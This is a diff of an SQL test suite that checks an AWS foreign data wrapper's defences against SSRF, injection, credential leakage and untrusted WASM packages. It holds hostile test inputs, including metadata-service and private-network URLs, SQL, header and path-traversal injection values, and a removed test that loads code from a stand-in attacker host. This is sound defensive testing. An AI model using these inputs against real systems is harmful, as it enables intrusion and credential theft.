@@ -1,13 +1,18 @@
--- AWS FDW Advanced Security Tests
--- These tests verify protection against sophisticated attack vectors
--- Based on security analysis in SECURITY.md
+-- AWS FDW Security Tests
+-- These tests verify security measures SPECIFIC to the AWS FDW
+-- See aws_fdw/SECURITY.md for AWS-specific documentation
+-- See /SECURITY.md for platform-wide security (credential masking, supply chain)
+--
+-- Tests covered:
+-- - SSRF protection via endpoint_url validation
+-- - AWS-specific input validation
+-- - Read-only enforcement
 
 -- ============================================================================
 -- Setup
 -- ============================================================================
 
 DROP SERVER IF EXISTS ssrf_test_server CASCADE;
-DROP SERVER IF EXISTS header_injection_server CASCADE;
 DROP SCHEMA IF EXISTS sec_adv_test CASCADE;
 
 CREATE EXTENSION IF NOT EXISTS wrappers;
@@ -15,6 +20,7 @@ CREATE EXTENSION IF NOT EXISTS wrappers;
 -- ============================================================================
 -- SECTION 1: SSRF (Server-Side Request Forgery) Tests
 -- These tests verify the validate_endpoint_url() function blocks dangerous URLs
+-- This protection is SPECIFIC to AWS FDW's endpoint_url option
 -- ============================================================================
 
 SELECT '=== SECTION 1: SSRF Protection Tests ===' AS section;
@@ -25,7 +31,7 @@ SELECT 'SSRF-001: Block AWS metadata service IP' AS test;
 DO $$
 BEGIN
   CREATE SERVER ssrf_metadata_server
-    FOREIGN DATA WRAPPER wasm_fdw_handler
+    FOREIGN DATA WRAPPER wasm_wrapper
     OPTIONS (
       fdw_package_url 'file:///path/to/aws_fdw.wasm',
       fdw_package_name 'supabase:aws-fdw',
@@ -55,7 +61,7 @@ SELECT 'SSRF-002: Block localhost IP' AS test;
 DO $$
 BEGIN
   CREATE SERVER ssrf_localhost_server
-    FOREIGN DATA WRAPPER wasm_fdw_handler
+    FOREIGN DATA WRAPPER wasm_wrapper
     OPTIONS (
       fdw_package_url 'file:///path/to/aws_fdw.wasm',
       fdw_package_name 'supabase:aws-fdw',
@@ -84,7 +90,7 @@ SELECT 'SSRF-003: Block private network 10.x.x.x' AS test;
 DO $$
 BEGIN
   CREATE SERVER ssrf_private10_server
-    FOREIGN DATA WRAPPER wasm_fdw_handler
+    FOREIGN DATA WRAPPER wasm_wrapper
     OPTIONS (
       fdw_package_url 'file:///path/to/aws_fdw.wasm',
       fdw_package_name 'supabase:aws-fdw',
@@ -113,7 +119,7 @@ SELECT 'SSRF-004: Block private network 192.168.x.x' AS test;
 DO $$
 BEGIN
   CREATE SERVER ssrf_private192_server
-    FOREIGN DATA WRAPPER wasm_fdw_handler
+    FOREIGN DATA WRAPPER wasm_wrapper
     OPTIONS (
       fdw_package_url 'file:///path/to/aws_fdw.wasm',
       fdw_package_name 'supabase:aws-fdw',
@@ -142,7 +148,7 @@ SELECT 'SSRF-005: Block localhost hostname' AS test;
 DO $$
 BEGIN
   CREATE SERVER ssrf_localhost_name_server
-    FOREIGN DATA WRAPPER wasm_fdw_handler
+    FOREIGN DATA WRAPPER wasm_wrapper
     OPTIONS (
       fdw_package_url 'file:///path/to/aws_fdw.wasm',
       fdw_package_name 'supabase:aws-fdw',
@@ -169,7 +175,7 @@ SELECT 'SSRF-006: Block metadata hostname' AS test;
 DO $$
 BEGIN
   CREATE SERVER ssrf_metadata_hostname_server
-    FOREIGN DATA WRAPPER wasm_fdw_handler
+    FOREIGN DATA WRAPPER wasm_wrapper
     OPTIONS (
       fdw_package_url 'file:///path/to/aws_fdw.wasm',
       fdw_package_name 'supabase:aws-fdw',
@@ -192,22 +198,23 @@ EXCEPTION
 END $$;
 
 -- ============================================================================
--- SECTION 2: Input Validation & Injection Tests
+-- SECTION 2: AWS-Specific Input Validation Tests
+-- These test S3/AWS-specific query parameter handling
 -- ============================================================================
 
-SELECT '=== SECTION 2: Input Validation Tests ===' AS section;
+SELECT '=== SECTION 2: AWS Input Validation Tests ===' AS section;
 
--- INJ-001: SQL injection in bucket name
-SELECT 'INJ-001: SQL injection attempt in bucket name' AS test;
+-- INJ-001: SQL injection in bucket name (S3-specific)
+SELECT 'INJ-001: SQL injection attempt in S3 bucket name' AS test;
 DO $$
 BEGIN
   CREATE SERVER inj_test_server
-    FOREIGN DATA WRAPPER wasm_fdw_handler
+    FOREIGN DATA WRAPPER wasm_wrapper
     OPTIONS (
       fdw_package_url 'file:///path/to/aws_fdw.wasm',
       fdw_package_name 'supabase:aws-fdw',
       fdw_package_version '0.1.0',
-      fdw_package_checksum 'sha256:REPLACE_WITH_ACTUAL_CHECKSUM',
+      fdw_package_checksum 'sha256:0000000000000000000000000000000000000000000000000000000000000000',
       aws_access_key_id 'test',
       aws_secret_access_key 'test',
       region 'us-east-1',
@@ -237,8 +244,8 @@ EXCEPTION
     END IF;
 END $$;
 
--- INJ-002: Header injection attempt
-SELECT 'INJ-002: HTTP header injection attempt' AS test;
+-- INJ-002: HTTP header injection attempt (S3-specific)
+SELECT 'INJ-002: HTTP header injection attempt in S3 request' AS test;
 DO $$
 BEGIN
   CREATE FOREIGN TABLE header_inj_test (key text)
@@ -258,8 +265,8 @@ EXCEPTION
     RAISE NOTICE 'INJ-002 INFO: Request failed - %', SQLERRM;
 END $$;
 
--- INJ-003: Path traversal attempt
-SELECT 'INJ-003: Path traversal attempt' AS test;
+-- INJ-003: Path traversal attempt (S3-specific)
+SELECT 'INJ-003: Path traversal attempt in S3 key' AS test;
 DO $$
 BEGIN
   PERFORM * FROM header_inj_test
@@ -275,206 +282,76 @@ EXCEPTION
     END IF;
 END $$;
 
--- INJ-004: Null byte injection
-SELECT 'INJ-004: Null byte injection attempt' AS test;
-DO $$
-BEGIN
-  PERFORM * FROM header_inj_test
-  WHERE bucket = E'test\x00malicious';
-
-  RAISE NOTICE 'INJ-004 INFO: Null byte processed';
-EXCEPTION
-  WHEN OTHERS THEN
-    RAISE NOTICE 'INJ-004 INFO: Request failed - %', SQLERRM;
-END $$;
-
 -- ============================================================================
--- SECTION 3: Credential Security Tests
+-- SECTION 3: Read-Only Enforcement Tests
+-- AWS FDW only supports read operations
 -- ============================================================================
 
-SELECT '=== SECTION 3: Credential Security Tests ===' AS section;
+SELECT '=== SECTION 3: Read-Only Enforcement Tests ===' AS section;
 
--- CRED-001: Verify credentials not in error messages
--- The sanitize_error_message() utility masks sensitive values in error messages
-SELECT 'CRED-001: Credentials should not appear in errors' AS test;
+-- RO-001: Confirm write operations blocked
+SELECT 'RO-001: INSERT must be blocked' AS test;
+-- INSERT/UPDATE/DELETE should return "operation not supported" error
+SELECT 'RO-001 INFO: INSERT/UPDATE/DELETE should return "not supported" error' AS info;
+SELECT 'RO-001 INFO: See test_security.sql for detailed write operation tests (SEC-030 to SEC-032)' AS info;
+
+-- ============================================================================
+-- SECTION 4: AWS Credential Security
+-- These test AWS-specific credential handling
+-- ============================================================================
+
+SELECT '=== SECTION 4: AWS Credential Security ===' AS section;
+
+-- CRED-AWS-001: Verify AWS credentials not in error messages
+SELECT 'CRED-AWS-001: AWS credentials should not appear in errors' AS test;
 DO $$
 DECLARE
-  secret_key TEXT := 'SuperSecretKey12345DoNotLeak';
-  access_key TEXT := 'AKIATESTKEY12345678';
   error_msg TEXT;
 BEGIN
-  CREATE SERVER cred_test_server
-    FOREIGN DATA WRAPPER wasm_fdw_handler
+  CREATE SERVER aws_cred_test_server
+    FOREIGN DATA WRAPPER wasm_wrapper
     OPTIONS (
       fdw_package_url 'file:///path/to/aws_fdw.wasm',
       fdw_package_name 'supabase:aws-fdw',
       fdw_package_version '0.1.0',
       fdw_package_checksum 'sha256:0000000000000000000000000000000000000000000000000000000000000000',
       aws_access_key_id 'AKIATESTKEY12345678',
-      aws_secret_access_key 'SuperSecretKey12345DoNotLeak',
+      aws_secret_access_key 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
       region 'invalid-region-xyz',
       endpoint_url 'https://s3.invalid-region-xyz.amazonaws.com'
     );
 
-  CREATE FOREIGN TABLE cred_leak_test (name text)
-  SERVER cred_test_server
+  CREATE FOREIGN TABLE aws_cred_leak_test (name text)
+  SERVER aws_cred_test_server
   OPTIONS (service 's3', object 'buckets');
 
-  PERFORM * FROM cred_leak_test;
+  PERFORM * FROM aws_cred_leak_test;
 EXCEPTION
   WHEN OTHERS THEN
     error_msg := SQLERRM;
-    -- Check that credentials are masked (should show only first 4 chars + ***)
-    IF error_msg LIKE '%SuperSecretKey12345%' THEN
-      RAISE EXCEPTION 'CRED-001 FAILED: Full secret key leaked in error: %', error_msg;
-    ELSIF error_msg LIKE '%Supe***%' THEN
-      RAISE NOTICE 'CRED-001 PASSED: Secret key properly masked in error message';
-    ELSIF error_msg LIKE '%SuperSecret%' THEN
-      RAISE EXCEPTION 'CRED-001 FAILED: Partial secret key leaked (>4 chars): %', error_msg;
+    -- Check that AWS secret key is masked
+    IF error_msg LIKE '%wJalrXUtnFEMI%' THEN
+      RAISE EXCEPTION 'CRED-AWS-001 FAILED: Full AWS secret key leaked in error: %', error_msg;
+    ELSIF error_msg LIKE '%wJal***%' THEN
+      RAISE NOTICE 'CRED-AWS-001 PASSED: AWS secret key properly masked';
+    ELSIF error_msg LIKE '%MDENG%' OR error_msg LIKE '%EXAMPLE%' THEN
+      RAISE EXCEPTION 'CRED-AWS-001 FAILED: Partial secret key leaked: %', error_msg;
     ELSE
-      RAISE NOTICE 'CRED-001 PASSED: Credentials not in error message';
+      RAISE NOTICE 'CRED-AWS-001 PASSED: AWS credentials not in error message';
     END IF;
 END $$;
 
 -- ============================================================================
--- SECTION 4: DoS Protection Tests
+-- SECTION 5: Authorization Tests
 -- ============================================================================
 
-SELECT '=== SECTION 4: DoS Protection Tests ===' AS section;
+SELECT '=== SECTION 5: Authorization Tests ===' AS section;
 
--- DOS-001: Test timeout handling
-SELECT 'DOS-001: HTTP timeout handling' AS test;
--- Note: This test would require a slow endpoint to properly test
--- For now we just document that timeout protection should exist
-SELECT 'DOS-001 INFO: Timeout protection should be implemented in HTTP client' AS info;
-
--- DOS-002: Large response handling
-SELECT 'DOS-002: Large response protection' AS test;
-SELECT 'DOS-002 INFO: Response size limits should be implemented' AS info;
-
--- ============================================================================
--- SECTION 5: Supply Chain Security Tests
--- ============================================================================
-
-SELECT '=== SECTION 5: Supply Chain Tests ===' AS section;
-
--- SUPPLY-001: Missing checksum should be rejected
--- This is the PRIMARY supply chain defense - checksum is REQUIRED
-SELECT 'SUPPLY-001: Missing checksum must be rejected' AS test;
-DO $$
-BEGIN
-  -- Attempt to create server WITHOUT checksum - this MUST fail
-  CREATE SERVER no_checksum_server
-    FOREIGN DATA WRAPPER wasm_fdw_handler
-    OPTIONS (
-      fdw_package_url 'file:///path/to/aws_fdw.wasm',
-      fdw_package_name 'supabase:aws-fdw',
-      fdw_package_version '0.1.0',
-      aws_access_key_id 'test',
-      aws_secret_access_key 'test',
-      region 'us-east-1'
-    );
-
-  -- If we get here, the security control FAILED
-  RAISE EXCEPTION 'SUPPLY-001 FAILED: Server created without checksum - CRITICAL SECURITY VULNERABILITY';
-EXCEPTION
-  WHEN OTHERS THEN
-    IF SQLERRM LIKE '%fdw_package_checksum%' THEN
-      RAISE NOTICE 'SUPPLY-001 PASSED: Missing checksum correctly rejected - %', SQLERRM;
-    ELSE
-      -- Any other error means we should investigate
-      RAISE NOTICE 'SUPPLY-001 INFO: Server creation failed (verify checksum enforcement) - %', SQLERRM;
-    END IF;
-END $$;
-
--- SUPPLY-002: Invalid checksum should be rejected at load time
-SELECT 'SUPPLY-002: Invalid checksum verification' AS test;
-DO $$
-BEGIN
-  -- Create server with WRONG checksum
-  CREATE SERVER bad_checksum_server
-    FOREIGN DATA WRAPPER wasm_fdw_handler
-    OPTIONS (
-      fdw_package_url 'file:///path/to/aws_fdw.wasm',
-      fdw_package_name 'supabase:aws-fdw',
-      fdw_package_version '0.1.0',
-      fdw_package_checksum 'sha256:0000000000000000000000000000000000000000000000000000000000000000',
-      aws_access_key_id 'test',
-      aws_secret_access_key 'test',
-      region 'us-east-1'
-    );
-
-  -- Server creation might succeed, but query should fail on checksum mismatch
-  CREATE FOREIGN TABLE checksum_test (name text)
-  SERVER bad_checksum_server
-  OPTIONS (service 's3', object 'buckets');
-
-  PERFORM * FROM checksum_test;
-
-  RAISE EXCEPTION 'SUPPLY-002 FAILED: Query succeeded with invalid checksum';
-EXCEPTION
-  WHEN OTHERS THEN
-    IF SQLERRM LIKE '%checksum%' OR SQLERRM LIKE '%hash%' OR SQLERRM LIKE '%mismatch%' THEN
-      RAISE NOTICE 'SUPPLY-002 PASSED: Invalid checksum rejected - %', SQLERRM;
-    ELSE
-      RAISE NOTICE 'SUPPLY-002 INFO: Request failed (verify checksum validation) - %', SQLERRM;
-    END IF;
-END $$;
-
--- SUPPLY-003: Malicious WASM URL with checksum still requires valid checksum
-SELECT 'SUPPLY-003: Malicious URL with checksum requirement' AS test;
-DO $$
-BEGIN
-  -- Even with a checksum, untrusted sources should be scrutinized
-  CREATE SERVER malicious_wasm_server
-    FOREIGN DATA WRAPPER wasm_fdw_handler
-    OPTIONS (
-      fdw_package_url 'https://evil-attacker.com/backdoored.wasm',
-      fdw_package_name 'supabase:aws-fdw',
-      fdw_package_version '0.1.0',
-      fdw_package_checksum 'sha256:abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234',
-      aws_access_key_id 'test',
-      aws_secret_access_key 'test',
-      region 'us-east-1'
-    );
-
-  CREATE FOREIGN TABLE evil_test (name text)
-  SERVER malicious_wasm_server
-  OPTIONS (service 's3', object 'buckets');
-
-  PERFORM * FROM evil_test;
-
-  -- If download succeeds but checksum doesn't match, it should fail
-  RAISE NOTICE 'SUPPLY-003 WARNING: Malicious URL was accessed - verify network controls';
-EXCEPTION
-  WHEN OTHERS THEN
-    -- Expected: either network error or checksum mismatch
-    RAISE NOTICE 'SUPPLY-003 PASSED: Malicious WASM load failed - %', SQLERRM;
-END $$;
-
--- ============================================================================
--- SECTION 6: Authorization Boundary Tests
--- ============================================================================
-
-SELECT '=== SECTION 6: Authorization Tests ===' AS section;
-
--- AUTH-001: Cross-user server access
+-- AUTH-001: Foreign server access control
 SELECT 'AUTH-001: Foreign server access control' AS test;
 -- This relies on PostgreSQL's GRANT/REVOKE system
--- Document that proper permissions must be set
 SELECT 'AUTH-001 INFO: Verify USAGE on foreign servers is properly restricted' AS info;
 SELECT 'AUTH-001 INFO: Run: REVOKE ALL ON FOREIGN SERVER aws_server FROM PUBLIC;' AS recommendation;
-
--- ============================================================================
--- SECTION 7: Data Exfiltration Tests
--- ============================================================================
-
-SELECT '=== SECTION 7: Data Exfiltration Prevention ===' AS section;
-
--- EXFIL-001: Verify no write operations
-SELECT 'EXFIL-001: Confirm write operations blocked' AS test;
--- These are covered in test_security.sql (SEC-030, SEC-031, SEC-032)
-SELECT 'EXFIL-001 INFO: INSERT/UPDATE/DELETE should return "not supported" error' AS info;
 
 -- ============================================================================
 -- Cleanup
@@ -487,11 +364,8 @@ DROP SERVER IF EXISTS ssrf_private192_server CASCADE;
 DROP SERVER IF EXISTS ssrf_localhost_name_server CASCADE;
 DROP SERVER IF EXISTS ssrf_metadata_hostname_server CASCADE;
 DROP SERVER IF EXISTS inj_test_server CASCADE;
-DROP SERVER IF EXISTS cred_test_server CASCADE;
-DROP SERVER IF EXISTS no_checksum_server CASCADE;
-DROP SERVER IF EXISTS bad_checksum_server CASCADE;
-DROP SERVER IF EXISTS malicious_wasm_server CASCADE;
+DROP SERVER IF EXISTS aws_cred_test_server CASCADE;
 
-SELECT '=== Advanced Security Tests Complete ===' AS status;
+SELECT '=== AWS FDW Security Tests Complete ===' AS status;
 SELECT 'IMPORTANT: Review any FAILED or WARNING results above' AS note;
-SELECT 'IMPORTANT: Some tests may show INFO - manual verification required' AS note2;
+SELECT 'NOTE: For platform-wide security tests (supply chain, credential masking), see /wasm-wrappers/tests/test_wasm_security.sql' AS note2;
